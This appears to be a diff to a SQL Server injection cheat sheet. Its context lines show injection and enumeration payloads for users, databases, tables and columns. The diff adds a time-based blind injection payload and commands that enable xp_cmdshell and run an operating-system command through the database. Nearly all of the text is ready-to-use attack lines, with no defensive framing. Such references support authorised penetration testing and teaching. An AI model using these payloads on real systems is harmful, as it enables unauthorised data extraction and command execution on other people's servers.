@@ -6,7 +6,10 @@ syntax: transact-sql
 -- * beware of possible length restriction
 '+(select ...)+'
 
--- Useful queries
+-- Sleep 5 seconds
+waitfor delay '0:0:5'
+
+-- Useful enumeration queries
 -- * get current database user
 select user_name()
 -- * get all database users
@@ -21,3 +24,11 @@ select string_agg(name, ',') from master..sysdatabases
 select string_agg(name, ',') from DB..sysobjects where xtype = 'U'
 -- * get columns of table
 select string_agg(name, ',') from syscolumns where id = (select id from sysobjects where name = 'TABLE')
+
+-- Code execution via xp_cmdshell
+-- * enable xp_cmdshell
+exec master.dbo.sp_configure 'show advanced options',1; RECONFIGURE; exec master.dbo.sp_configure 'xp_cmdshell',1; RECONFIGURE
+-- * execute xp_cmdshell
+exec master..xp_cmdshell 'whoami'
+-- * disable xp_cmdshell
+exec master.dbo.sp_configure 'xp_cmdshell',0; RECONFIGURE; exec master.dbo.sp_configure 'show advanced options',0; RECONFIGURE
